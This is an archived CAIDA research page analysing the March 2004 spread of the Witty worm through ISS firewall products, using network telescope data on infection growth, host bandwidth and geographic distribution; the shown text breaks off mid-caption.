
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <!--[if lt IE 9]><script src='//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.0/html5shiv.min.js'></script><![endif] -->
  <title>The Spread of the Witty Worm - CAIDA</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

          

              
                    <meta name="twitter:card" content="summary_large_image" />
                    <meta name="twitter:image" content="https://www.caida.org/card/archive_witty.png" />
  <meta name="twitter:title" content="The Spread of the Witty Worm" />
  <meta name="twitter:site" content="@caidaorg" />
  <meta name="twitter:description" content="An analysis by Colleen Shannon and David Moore of the spread of the Witty Internet Worm in March 2004." />
  <meta property="og:title" content="The Spread of the Witty Worm" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://www.caida.org/archive/witty/" />

          

              
                    <meta property="og:image" content="https://www.caida.org/card/archive_witty.png" />
  <meta property="og:site_name" content="CAIDA" />
  <meta property="og:updated_time" content="2020-08-03T21:14:17+00:00" />
  <meta property="article:publisher" content="https://www.facebook.com/caidaorg" />
  <meta property="article:section" content="archive" />
  <meta property="og:description" content="An analysis by Colleen Shannon and David Moore of the spread of the Witty Internet Worm in March 2004." />
  <meta name="description" content="An analysis by Colleen Shannon and David Moore of the spread of the Witty Internet Worm in March 2004." />  
  <link rel="icon" href="https://www.caida.org/favicon.ico">
  <link rel="apple-touch-icon" sizes="180x180" href="https://www.caida.org/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://www.caida.org/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://www.caida.org/favicon-16x16.png">
  <link rel="manifest" href="https://www.caida.org/site.webmanifest">
  <link rel="mask-icon" href="https://www.caida.org/safari-pinned-tab.svg" color="#e37d35">
  <meta name="msapplication-TileColor" content="#2b5797">
  <meta name="theme-color" content="#ffffff">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js" integrity="sha256-VazP97ZCwtekAsvgPBSUwPFKdrwD3unUfSGVYrahUqU=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
  <script>
    $( document ).ready(function() {    
      breadcrumbTogglesWidth();
    });
  </script>
  <link rel="stylesheet" href="/css/style.min.bb8b9d87b98f075a9d078dc9142b2428537eea79b6130452a7ca762edd132609.css">
    <link rel="stylesheet" media="print" href="/css/print.min.e06ff4650f1106985b266c1236ea916037463bce127016b8741f19876c259e22.css">
    
    </head>

<body class='page page-default-list'>
  <nav id="main-menu-mobile" class="main-menu-mobile overflow-auto">
  <ul>
    <li class="menu-item-resource catalog">       
      <a href="https://catalog.caida.org/"><span>Resource Catalog</span></a>
        <a class="subsection" href="https://catalog.caida.org/search?query=types=dataset%20links=tag:caida%20"><span>Datasets</span></a>
        <a class="subsection" href="https://catalog.caida.org/search?query=types=presentation%20links=tag:caida%20"><span>Media / Presentations</span></a>
        <a class="subsection" href="https://catalog.caida.org/search?query=types=paper%20links=tag:caida%20"><span>Papers</span></a>
        <a class="subsection" href="https://catalog.caida.org/search?query=types=recipe%20"><span>Recipes</span></a>
        <a class="subsection" href="https://catalog.caida.org/search?query=types=software%20"><span>Software / Tools</span></a>
    </li>
    <li class="menu-item-about">       
      <a href="/about/"><span>About</span></a>
        <a class="subsection" href="/about/supporting/"><span>Supporting</span></a>
        <a class="subsection" href="/about/donate/"><span>Donate</span></a>
        <a class="subsection" href="/about/sponsors/"><span>Sponsors</span></a>
        <a class="subsection" href="/about/jobs/"><span>Jobs at CAIDA</span></a>
        <a class="subsection" href="/about/annualreports/"><span>Annual Reports</span></a>
        <a class="subsection" href="/about/progplan/"><span>Program Plan</span></a>
        <a class="subsection" href="/about/legal/"><span>Legal Agreements</span></a>
        <a class="subsection" href="/about/sso/"><span>Single Sign-On</span></a>
        <a class="subsection" href="/staff/"><span>Staff</span></a>
        <a class="subsection" href="https://blog.caida.org/"><span>Blog</span></a>
        <a class="subsection" href="/about/contactinfo/"><span>Contact Us</span></a>
    </li>
    <li class="menu-item-workshops">
        <a href="/workshops/"><span>Workshops</span></a>
    </li>
    <li class="menu-item-projects">
        <a href="/projects/"><span>Projects</span></a>
    </li>
    <li class="menu-item-funding">
        <a href="/funding/"><span>Funding</span></a>
    </li>
  </ul>
</nav>
  <div class="wrapper">
    <header>
    <div class='header'>
  <div class="container">
    
    <div class="logo">
      
      <a href="https://www.caida.org/"><img alt="Logo" src="/images/caida.png" title="CAIDA - Center for Applied Internet Data Analysis" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://www.caida.org/"><img alt="Logo" src="/images/caida_mobile.png" title="CAIDA - Center for Applied Internet Data Analysis" /></a>
    </div>
    <div class="d-none d-print-block p-2"><h1 class="text-light">The Spread of the Witty Worm</h1></div>
    <nav id="main-menu" class="main-menu">
    <div class="btn-group">
       
        <a href="https://catalog.caida.org/" class="btn btn-light btn-md dropdown-toggle minw " aria-haspopup="true" role="button" ><span class="d-lg-none">Catalog</span><span class="d-none d-lg-block">Resource Catalog</span><span class="sr-only" data-toggle="dropdown"> Toggle Dropdown</span></a>
        <div class="dropdown-menu">
            
              <div class="dropdown-submenu">
                <a class="dropdown-item dropdown-toggle" href="https://catalog.caida.org/search?query=types=dataset%20links=tag:caida%20">Datasets</a>
                <div class="dropdown-menu">
                    <a class="dropdown-item" href="/catalog/datasets/overview/">Overview table</a>
                </div>
              </div>
            
            
              <div class="dropdown-submenu">
                <a class="dropdown-item dropdown-toggle" href="https://catalog.caida.org/search?query=types=presentation%20links=tag:caida%20">Media / Presentations</a>
                <div class="dropdown-menu">
                    <a class="dropdown-item" href="https://www.caida.org/catalog/media/posters/">Posters</a>
                    <a class="dropdown-item" href="https://www.caida.org/catalog/media/visualizations/">Visualizations</a>
                </div>
              </div>
            
            
              <div class="dropdown-submenu">
                <a class="dropdown-item dropdown-toggle" href="https://catalog.caida.org/search?query=types=paper%20links=tag:caida%20">Papers</a>
                <div class="dropdown-menu">
                    <a class="dropdown-item" href="https://catalog.caida.org/search?query=types=paper%20!links=tag:caida%20links=tag:used_caida_data%20">External papers</a>
                    <a class="dropdown-item" href="https://www.caida.org/catalog/datasets/publications/report-publication/">Report new publication</a>
                </div>
              </div>
            
            
              <a class="dropdown-item solo" href="https://catalog.caida.org/search?query=types=recipe%20">Recipes</a>
            
              <a class="dropdown-item solo" href="https://catalog.caida.org/search?query=types=software%20">Software / Tools</a>
        </div>
      
    </div>
    <div class="btn-group">
       
        <a href="/about/" class="btn btn-light btn-md dropdown-toggle minw " aria-haspopup="true" role="button" ><span class="d-lg-none">About</span><span class="d-none d-lg-block">About</span><span class="sr-only" data-toggle="dropdown"> Toggle Dropdown</span></a>
        <div class="dropdown-menu">
            
              <a class="dropdown-item solo" href="/about/supporting/">Supporting</a>
            
              <a class="dropdown-item solo" href="/about/donate/">Donate</a>
            
              <a class="dropdown-item solo" href="/about/sponsors/">Sponsors</a>
            
              <a class="dropdown-item solo" href="/about/jobs/">Jobs at CAIDA</a>
            
              <a class="dropdown-item solo" href="/about/annualreports/">Annual Reports</a>
            
              <a class="dropdown-item solo" href="/about/progplan/">Program Plan</a>
            
              <a class="dropdown-item solo" href="/about/legal/">Legal Agreements</a>
            
              <a class="dropdown-item solo" href="/about/sso/">Single Sign-On</a>
            
              <a class="dropdown-item solo" href="/staff/">Staff</a>
            
              <a class="dropdown-item solo" href="https://blog.caida.org/">Blog</a>
            
              <a class="dropdown-item solo" href="/about/contactinfo/">Contact Us</a>
        </div>
      
    </div>
    <div class="btn-group">
      
        <a href="/workshops/" class="btn btn-light btn-md dropdown-toggle minw " aria-haspopup="true" role="button" >Workshops<span class="sr-only" data-toggle="dropdown"> Toggle Dropdown</span></a>
          
        <div class="dropdown-menu">
  
  <a class="dropdown-item wkshp" href="/workshops/?workshopserieslisting=GMI&show_all=1" title="GMI3S">GMI Meetings</a>
      <a class="dropdown-item solo wkshp" href="/workshops/aims/2502/" title="GMI-AIMS-5">GMI-AIMS-5</a>
      <a class="dropdown-item solo wkshp" href="/workshops/aims/2305/" title="AIMS 2023">AIMS 2023</a>
      <a class="dropdown-item solo wkshp" href="/workshops/dust/2107/" title="DUST 2021 - 3rd International Workshop on Darkspace and UnSolicited Traffic Analysis">DUST 2021</a>
      <a class="dropdown-item solo wkshp" href="/workshops/wombir/2104/" title="2nd NSF Workshop on Overcoming Measurement Barriers to Internet Research (WOMBIR-2)">WOMBIR-2</a>
      <a class="dropdown-item solo wkshp" href="/workshops/wombir/2101/" title="NSF Workshop on Overcoming Measurement Barriers to Internet Research (WOMBIR 2021)">WOMBIR-1</a>
        </div>
      
    </div>
    <div class="btn-group">
      
        <a href="/projects/" class="btn btn-light btn-md dropdown-toggle minw " aria-haspopup="true" role="button" >Projects<span class="sr-only" data-toggle="dropdown"> Toggle Dropdown</span></a>
          
        <div class="dropdown-menu">
  
          <a class="dropdown-item solo" href="/projects/starnova/" title="Scalable Technology to Accelerate Research Network Operations Vulnerability Alerts">STARNOVA</a>
          <a class="dropdown-item solo" href="/projects/avoid/" title="Automated Verification Of Internet Data-paths for 5G">AVOID</a>
          <a class="dropdown-item solo" href="/projects/rabbits/" title="A Toolkit for Reproducible Assessment of Broadband Internet Topology and Speed">RABBITS</a>
          <a class="dropdown-item solo" href="/projects/cloudbottlenecks/" title="Detection and Analysis of Infrastructure Bottlenecks in a Cloud-Centric Internet">Cloud Bottlenecks</a>
          <a class="dropdown-item solo" href="/projects/gmi3s/" title="Designing a Global Measurement Infrastructure to Improve Internet Security">GMI</a>
          <a class="dropdown-item solo" href="/projects/spoofer/" title="Spoofer">Spoofer</a>
          <a class="dropdown-item solo" href="/projects/cloudtrace/" title="Cloudtrace">Cloudtrace</a>
          <a class="dropdown-item solo" href="/projects/fantail/" title="Facilitating Advances in Network Topology Analysis">FANTAIL</a>
          <a class="dropdown-item solo" href="/projects/network_telescope/" title="Network Telescope">Network Telescope</a>
          <a class="dropdown-item solo" href="/projects/as-core/" title="AS Core Visualization">AS Core Visualization</a>
          <a class="dropdown-item solo" href="/projects/ark/" title="Archipelago Measurement Infrastructure">Ark</a>
        </div>
      
    </div>
    <div class="btn-group">
      
        <a href="/funding/" class="btn btn-light btn-md dropdown-toggle minw " aria-haspopup="true" role="button" >Funding<span class="sr-only" data-toggle="dropdown"> Toggle Dropdown</span></a>
          
        <div class="dropdown-menu">
  
          <a class="dropdown-item solo" href="/funding/ite-avoid5g/" title="Automated Verification Of Internet Data-paths for 5G">AVOID-5G</a>
          <a class="dropdown-item solo" href="/funding/cns-rabbits/" title="A measurement toolkit for Reproducible Assessment of BroadBand Internet Topology and Speed">RABBITS</a>
          <a class="dropdown-item solo" href="/funding/cici-starnova/" title="Scalable Technology to Accelerate Research Network Operations Vulnerability Alerts">STARNOVA</a>
          <a class="dropdown-item solo" href="/funding/cns-cloudbottlenecks/" title="Detection and Analysis of Infrastructure Bottlenecks in a Cloud-Centric Internet">Cloud Bottlenecks</a>
          <a class="dropdown-item solo" href="/funding/msri-gmi3s/" title="Designing a Global Measurement Infrastructure to Improve Internet Security">MSRI-GMI3S</a>
          <a class="dropdown-item solo" href="/funding/ccri-ilands/" title="Integrated Library for Advancing Network Data Science">ILANDS</a>
        </div>
      
    </div>
</nav>

<div id="searchbox" class="d-none d-xl-block d-print-none">
  <form method="GET" action="https://duckduckgo.com/" id="ddgform-main" class="form-inline my-2 my-xl-0">
    <div class="input-group">
      <input name="q" id="ddg-xl-search" value="" class="form-control" type="search" placeholder="Search CAIDA" aria-label="Search">
      <input name="sites" value="www.caida.org" type="hidden">
      <span class="input-group-append">
        <button class="btn btn-outline-light ddg-search-button" aria-label="Search" title="Search within CAIDA pages" type="submit">
            <i class="fa fa-search fa-2x"></i>
        </button>
      </span>
    </div>   
  </form>
</div>

    <div class="d-xl-none d-print-none">
      <button class="btn d-inline d-xl-none btn-outline-light" aria-label="Search" data-toggle="collapse" data-target="#mobilesearch"><i class="fa fa-search"></i></button>
      
<button id="toggle-main-menu-mobile" class="btn hamburger hamburger--spin" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>

    </div>
  </div>
</div>
<div class="container d-print-none" data-id="mobilesearch">
  <div class="row">
    <div id="mobilesearch" class="col-12 collapse bg-primary ">
      <form method="GET" action="https://duckduckgo.com/" id="ddgform-mobile" class="my-2 my-xl-0">
        <div class="input-group d-xl-none">
          <input name="q" id="ddg-collapse-search" value="" class="form-control" type="search" placeholder="Search CAIDA" aria-label="Search">
          <input name="sites" value="www.caida.org" type="hidden">         
          <span class="input-group-append">
            <button class="btn btn-success ddg-search-button" aria-label="Search" type="submit">
                Search
            </button>
          </span>
        </div>        
      </form>
    </div>
  </div>
</div>
<div class="container">
<ul class="breadcrumb">
  
<li class="breadcrumb-item"><a href="/">CAIDA</a>
</li>
<li class="breadcrumb-item"><a href="/archive/">Archives</a>
</li>
<li class="breadcrumb-item active"><a >The Spread of the Witty Worm</a>
</li>
</ul></div>

    </header>
    <div class="alert alert-danger text-center">The contents of this legacy page are no longer maintained nor supported, and are made available only for historical purposes.</div>

    <div class="pt-2 pt-md-3 pb-3 pb-md-6" data-id="sidebarcontainer" id="sidebarcontainer">
        <div class="row">
          <aside class="col-12 order-1 col-lg-3 col-xxl-2 mb-3"  id="asidebar">
            <div class="sticky-top mw-50 sidebar ">
              

<div class="docs-menu">
  <h5 id="onthispage"><a href="#">On this page</a></h5><div id="pagetoc"></div> 

</div>  
  
            </div>
          </aside>
          <main class="col-12 order-12 col-lg-9 col-xxl-10">
<h1 class="title d-print-none">The Spread of the Witty Worm</h1></span>
  <div class="hrwrap"><p>
An analysis by Colleen Shannon and David Moore
of the spread of the Witty Internet Worm in
March 2004.  The network telescope and associated security efforts
are a joint project of the UCSD Computer Science and Engineering
Department and the Cooperative Association for Internet Data
Analysis.
For more information contact info@caida.org
</p>
<p>
We would like to thank Brian Kantor, Jim Madden, and Pat Wilson of
UCSD for technical support of the Network Telescope project; Mike
Gannis, Nicholas Weaver, Wendy Garvin, Team Cymru, and Stefan
Savage for feedback on this document; and the Cisco PSIRT Team,
Wendy Garvin, Team Cymru, Nicholas Weaver, and Vern Paxson for
discussion as events unfolded.  Support for this work was provided
by Cisco Systems, NSF, DARPA, DHS, and CAIDA members.
</p>
<center><table>
<tr>
<td><a href="https://www.caida.org"><img src="/images/logo_caida.gif" alt="Cooperative Association for Internet Data Analysis" /></a></td>
<td><a href="http://www.cs.ucsd.edu"><img src="/images/logo_ucsdcse.gif" alt="UCSD Computer Science Department" /></a></td>
<td><a href="http://www.ucsd.edu"><img src="/images/logo_ucsd.gif" alt="University of California at San Diego" /></a></td>
<td><a href="http://www.sdsc.edu"><img src="logo_sdsc_2004.gif" alt="San Diego Supercomputer Center" /></a></td>
<td><a href="http://www.cisco.com"><img src="/images/logo_cisco.gif" alt="Cisco Systems" /></a></td>
<td><a href="http://www.nsf.gov"><img src="/images/logo_NSF.gif" alt="National Science Foundation" /></a></td>
<td><a href="http://www.darpa.mil"><img src="/images/logo_darpa.gif" alt="Defense Advanced Research Projects Agency" /></a></td>
<td><a href="http://www.dhs.gov"><img src="/images/logo_dhs.gif" alt="U.S. Department of Homeland Security" /></a></td>
</tr>
</table></center>

  </div>

<div class="content"><h2><a name="Introduction" />Introduction</h2>
<blockquote> 
    <p>
    On Friday March 19, 2004 at approximately 8:45pm PST, an Internet
    worm began to spread, targeting a buffer overflow vulnerability in
    several Internet Security Systems
    (ISS) products, including ISS RealSecure Network, RealSecure
    Server Sensor, RealSecure Desktop, and BlackICE.  The
    worm takes advantage of a security flaw in these firewall
    applications that was discovered earlier this month by <a
    href="http://www.eeye.com">eEye Digital Security</a>. Once the
    Witty worm infects a computer, it deletes a randomly chosen section
    of the hard drive, over time rendering the machine unusable.  The
    worm's payload contained the phrase "<tt>(^.^) insert witty message
    here (^.^)</tt>" so it came to be known as the Witty worm.
    </p>
    <p>While the Witty worm is only the latest in a string of
    self-propagating remote exploits, it distinguishes itself through
    several interesting features:
    </p>
    <ul>
  <li>Witty was the first widely propagated Internet worm to carry a destructive payload.</li>
  <li>Witty was started in an organized manner with an order of magnitude more ground-zero hosts than any previous worm.</li>
  <li>Witty represents the shortest known interval between
  vulnerability disclosure and worm release -- it began to spread
  the day after the ISS vulnerability was publicized.</li>
  <li>Witty spread through a host population in which every compromised host was doing something proactive to secure their computers and networks.</li>
  <li>Witty spread through a population almost an order of magnitude smaller than that of previous worms, demonstrating the viability of worms as an automated mechanism to rapidly compromise machines on the Internet, even in niches without a software monopoly.</li>
    </ul>
    <p>In this document we share a global view of the spread of the Witty
    worm, with particular attention to these worrisome features.
    </p>
</blockquote> 
<h2><a name="Background" />Background</h2>
<blockquote> 
    <h3>Network Telescope</h3>
    <blockquote> 
    <p>The UCSD Network Telescope consists of a large piece of globally
  announced IPv4 address space.  The telescope contains almost no
  legitimate hosts, so inbound traffic to nonexistent machines is
  always anomalous in some way.  Because the network telescope
  contains approximately 1/256th of all IPv4 addresses, we
  receive roughly one out of every 256 packets sent by an
  Internet worm with an unbiased random number generator.
  Because we are uniquely situated to receive traffic from every
  worm-infected host, we provide a global view of the spread of
  Internet worms.
    </p>
    </blockquote> 
    <h3>ISS Vulnerability</h3>
    <blockquote> 
    <p>A number of Internet Security
  Systems firewall products contained a Protocol Analysis
  Module (PAM) to monitor application traffic.  The PAM routine
  in version 3.6.16 of iss-pam1.dll that analyzes ICQ server
  traffic assumes that incoming packets on port 4000 are ICQv5
  server responses and this code contains a series of buffer overflow
  vulnerabilities.  The <a
  href="http://www.eeye.com/html/Research/Advisories/AD20040318.html">vulnerability</a>
  was discovered by <a href="http://www.eeye.com/">eEye</a> on
  March 8, 2004 and announced by both <a
  href="http://www.eeye.com">eEye</a> and on March 18, 2004. ISS released an alert
  warning users of a possibly exploitable security hole and
  provided updated software versions that were not vulnerable to
  the buffer overflow attack.
    </p>
    </blockquote> 
    <h3>Witty Worm Details</h3>
    <blockquote> 
    <p>Once Witty infects a host, the host sends 20,000 packets by
  generating packets with a random destination IP address, a
  random size between 796 and 1307 bytes, and a destination
  port.  The worm payload of 637 bytes is padded with data from
  system memory to fill this random size and a packet is sent out
  from source port 4000.  After sending 20,000 packets, Witty
  seeks to a random point on the hard disk, writes 65k of data
  from the beginning of iss-pam1.dll to the disk.  After closing
  the disk, the worm repeats this process until the machine is
  rebooted or until the worm permanently crashes the machine.
    </p>
    </blockquote> 
</blockquote> 
<h2><a name="Spread"/>Witty Worm Spread</h2>
<blockquote> 
<p>  With previous Internet worms, including Code-Red, Nimda, and SQL
Slammer, a few hosts were seeded with the worm and proceeded to spread
it to the rest of the vulnerable population.  The spread was slow early
on and then accelerates dramatically as the number of infected machines
spewing worm packets to the rest of the Internet rises.  Eventually as
the victim population becomes saturated, the spread of the worm slows
because there are few vulnerable machines left to compromise.
Plotted on a graph, this worm growth appears as an S-shaped exponential
growth curve called a sigmoid.
</p>
<p> At 8:45:18pm<sup><a href="#TimeSync">[4]</a></sup> PST on March 19, 2004, the network telescope received
its first Witty worm packet.  In contrast to previous worms, we
observed 110 hosts infected in the first ten seconds, and 160 at the
end of 30 seconds.  The chances of a single instance of the worm
infecting 110 machines so quickly are vanishingly small -- worse than
10<sup>-607</sup>.  This rapid onset indicates that the worm used
either a hitlist or previously compromised vulnerable hosts to start
the worm.  In Figure 1 below, the initial vertical line shows
preselected hosts coming online, and then a transition to much slower
growth thereafter.
</p>
</blockquote> 
<center><table border="1">
    <tr><td><a href="realearly.png"><img src="realearly.small.png" alt="the beginning of the witty infection" /></a></td></tr>
    <tr><td width="350"><b><font size="-1">Figure 1:  Like many
  biological pathogens, Internet worms typically spread
  exponentially until their growth levels off. After the first
  minute, Witty followed this expected sigmoid curve. But within
  the first 30 seconds, between 100 and 160 computers were
  simultaneously activated, indicating either the use of a
  preprogrammed hitlist or a timed release of the worm on
  previously hacked machines.
  </font></b></td>
    </tr>
</table></center>
<blockquote> 
<p>After the sharp rise in initial coordinated activity, the Witty worm
followed a normal exponential growth curve for a pathogen spreading in
a fixed population.  Witty reached its peak after approximately 45
minutes, at which point the majority of vulnerable hosts had been
infected.  After that time, the churn caused by dynamic addressing
causes the IP address count to inflate without any additional Witty
infections.  At the peak of the infection, Witty hosts flooded the
Internet with more than 90Gbits/second of traffic (more than 11 million
packets per second).
</p>
<p>Witty infected only about a tenth as many hosts than the next
smallest widespread Internet worm.  Where SQL Slammer infected between
75,000 and 100,000 computers, the vulnerable population of the Witty
worm was only about 12,000 computers.  Although researchers <a
href="#Slammer">[1]</a><a href="#How20wn">[2]</a><a
href="#Quarantine">[3]</a> have long predicted that a fast-probing worm
could infect a small population very quickly, Witty is the first worm
to demonstrate this capability.  While Witty took 30 minutes longer
than SQL Slammer to infect its vulnerable population, both worms spread
far faster than human intervention could stop them.  In the past, users
of software that is not ubiquitously deployed have considered
themselves relatively safe from most network-based pathogens.  Witty
demonstrates that a remotely accessible bug in any minimally popular
piece of software can be successfully exploited by an automated
attack.
</p>
<p>Witty's destructive payload, in combination with efforts to filter
Witty traffic and patch infected machines, led to rapid decay in the
number of infected hosts.  12 hours after the worm began to spread,
half  of the Witty hosts were
already inactive.
</p>
</blockquote> 
<center><table border="1">
    <tr><td><a href="2hours.png"><img src="2hours.realsmall.png" alt="the first two hours of the witty worm spread" /></a></td>
  <td><a href="buckets.png"><img src="buckets.realsmall.png" alt="the progression of the witty infection over time" /></a></td>
    </tr>
    <tr><td width="350"><b><font size="-1">Figure 2: The exponential
  spread of the Witty worm.  The number of active machines in
  five minutes (green line) stabilized after 45 minutes,
  indicating that almost all of the vulnerable machines had been
  compromised.  After that point, dynamic addressing (e.g.  DHCP)
  caused the cumulative IP address total (the red line) to
  continue to rise.  We estimate the total number of hosts
  infected by the Witty worm to be 12,000 hosts at most.
  </font></b></td>
  <td width="350"><b><font size="-1">Figure 3: The number of
  unique hosts infected with the Witty worm over time.  Infected
  Witty hosts were deactivated much more quickly than with
  previous worms.  Although prompt network filtering and active
  cleanup of compromised hosts played an important role, we
  believe that the rapid decay in the number of hosts actively
  spreading Witty was primarily due to the destructive payload
  crashing infected machines.
  </font></b></td>
    </tr>
</table></center>
<h2><a name="Victims"/>Witty Worm Victims</h2>
<blockquote> 
<p>The vulnerable host population pool for the Witty worm was quite
different from that of previous virulent worms.  Previous worms have
lagged several weeks behind publication of details about the
remote-exploit bug, and large portions of the victim populations
appeared to not know what software was running on their machines, let
alone take steps to make sure that software was up to date with
security patches.  In contrast, the Witty worm infected a population of
hosts that were proactive about security -- they were running firewall
software.  The Witty worm also started to spread the day after
information about the exploit and the software upgrades to fix the bug
were available.
</p>
<p>Like SQL Slammer, the Witty worm was bandwidth limited -- each
infected host sent packets as fast as its Internet connection could
transmit them.  As shown in Figure 4 below, Witty infected a relatively
well-connected pool of hosts.  61% of infected hosts transmitted at
speeds between 96kbps (11.2pps) and 512kbps (60pps).  The average speed
of an infected host was 3Mbps (357pps), although during the peak of the
worm's spread, the average speed reached 8Mbps (970pps).  We also
observed 38 machines transmitting Witty packets at rates over 80Mbps
continuously for more than an hour.
</p>
<p>Some of the most rapidly transmitting IP addresses may actually be a
larger collection of hosts behind a Network Address Translation (NAT)
device of some kind.  By infecting firewall devices, Witty proved
particularly adept at thwarting security measures and successfully
infecting hosts on internal networks.  We also observed more than 300
hosts in the first few hours transmitting Witty from source ports
<em>other than</em> 4000.  Since the defining characteristic for
successful Witty infection is a source port 4000 packet, presumably
these machines are NAT boxes rewriting the source port of packets
originating at downstream infected hosts.  67 of those NAT boxes also
sent Witty packets with the correct source port 4000, so while some
NATs may artificially inflate the transmission speeds of a single
infected host, others may artificially deflate them by spreading
traffic across other ports.
</p>
</blockquote> 
<center><table border="1">
    <tr><td><a href="pps.png"><img src="pps.small.png" alt="the scanning rate of witty hosts" /></a></td></tr>
    <tr><td width="350"><b><font size="-1">Figure 4: The scanning rate
  in packets-per-second of hosts infected by the Witty worm.  The
  connection bandwidths that correspond to the packet rates are
  marked along the top of the graph.  53% of infected hosts had
  connection speeds between 128kbps (15pps) and 512kbps (60pps).
  The maximum packet rate observed from one host was 23,500 pps
  sustained for at least one hour.
  </font></b></td>
    </tr>
</table></center>
<blockquote> 
<p>Witty worm hosts showed a wide range of infection durations.  A
large number of factors influence our measurements of infection duration.
<ul>
    <li>Dynamic addressing significantly affects the amount of time an
  IP address remains active.  As with the SQL Slammer worm, the
  flood of packets from an infected host can reset its upstream
  connection (particularly with dialup hosts), causing the host
  to disconnect and reconnect from a different IP address.</li>
    <li>Similarly, end users may also be unaware that perceived
  slowness of their computer or Internet connection is caused by
  a worm, and they may reboot their computers in the hope that
  that will fix the problem.  If the random disk writes have not
  damaged anything critical to the boot process, each host may
  receive a different dynamic address.  For these dynamically
  addressed hosts, the duration we see reflects the duration for
  which each host maintained its DHCP lease, rather than the true
  duration of infection on that host.</li>
    <li>Traffic filtering also artificially limits our view of a host's
  infection duration, but at least in this case we accurately
  record the duration for which the victim spread the worm to
  other vulnerable hosts.</li>
    <li>Witty carried a destructive payload that would eventually crash
  the infected machine.  Thus even without a dynamic address or
  any human intervention, Witty would eventually (and often
  permanently) deactivate each infected host.</li>
</ul>
</p>
</blockquote> 
<center><table border="1">
    <tr><td><a href="dur.png"><img src="dur.small.png" alt="the duration of infection for witty hosts" /></a></td></tr>
    <tr><td width="350"><b><font size="-1">Figure 5: The infection
  duration for Witty hosts.  Unlike previously widespread
  Internet worms, the infection duration for Witty hosts was
  curtailed by the worm payload's malicious disk writes which crashed
  infected computers.  In-network filtering and active host
  cleanup also played important roles in limiting the spread of
  the Witty worm.
  </font></b></td>
    </tr>
</table></center>
<blockquote> 
<p>Because US-based ISS is a much smaller company than Microsoft with
less extensive overseas operations, the majority of Witty worm
infections occurred in the US.  Figures 6 and 7 show the number of
infected hosts in the top six countries and by geographic region over
the first 2.5 days of Witty spread.  Figure 7 shows clear diurnal
effects, with hundreds of additional vulnerable hosts becoming active
on Saturday morning local time (presumably as the computers are powered
on and connected to the Internet).  This cycle continues Sunday and
Monday mornings, although fewer and fewer vulnerable machines remain
uninfected over time.
</p>
</blockquote> 
<table align="center">
    <tr><td width="50%" valign="top">
  <center><table border="0">
      <tr>
    <td align="center"><table border="1" cellpadding="5">
        <tr>
      <th>Country</th><th align="center">Percent</th>
        </tr><tr>
      <td>United States</td><td align="right">26.28</td>
        </tr><tr>
      <td>United Kingdom</td><td align="right">7.27</td>
        </tr><tr>
      <td>Canada</td><td align="right">3.46</td>
        </tr><tr>
      <td>China</td><td align="right">3.36</td>
        </tr><tr>
      <td>France</td><td align="right">2.94</td>
        </tr><tr>
      <td>Japan</td><td align="right">2.17</td>
        </tr><tr>
      <td>Australia</td><td align="right">1.83</td>
        </tr><tr>
      <td>Germany</td><td align="right">1.82</td>
        </tr><tr>
      <td>Netherlands</td><td align="right">1.36</td>
        </tr><tr>
      <td>Korea</td><td align="right">1.21</td>
        </tr>
    </table></td>
      </tr><tr>
    <td width="350"><b><small>Table 1: Witty victim geographic distribution by country.</small></b></td>
      </tr>
  </table></center>
    </td><td>
  <center><table border="0">
      <tr>
    <td align="center"><table border="1" cellpadding="5">
        <tr>
      <th>TLD</th><th align="center">Percent</th>
        </tr><tr>
      <td align="center">net</td><td align="right">33</td>
        </tr><tr>
      <td align="center">com</td><td align="right">20</td>
        </tr><tr>
      <td align="center">NO-DNS</td><td align="right">15</td>
        </tr><tr>
      <td align="center">fr</td><td align="right">3</td>
        </tr><tr>
      <td align="center">ca</td><td align="right">2</td>
        </tr><tr>
      <td align="center">jp</td><td align="right">2</td>
        </tr><tr>
      <td align="center">au</td><td align="right">2</td>
        </tr><tr>
      <td align="center">edu</td><td align="right">1</td>
        </tr><tr>
      <td align="center">nl</td><td align="right">1</td>
        </tr><tr>
      <td align="center">ar</td><td align="right">1</td>
        </tr>
    </table></td>
      </tr><tr>
    <td width="350"><b><small>Table 2: Witty victim distribution by Top Level Domain (TLD).  TLD distribution is strongly influenced by dynamic host addressing.</small></b></td>
      </tr>
  </table></center>
    </td></tr>
</table>
<center><table border="1">
    <tr><td><a href="countries.png"><img src="countries.realsmall.png" alt="the witty infection broken down by countries" /></a></td>
  <td><a href="geo.png"><img src="geo.realsmall.png" alt="witty diurnal cycles around the world" /></a></td>
    </tr>
    <tr><td width="350"><b><font size="-1">Figure 6: The top six
  countries affected by the Witty worm.  After the initial
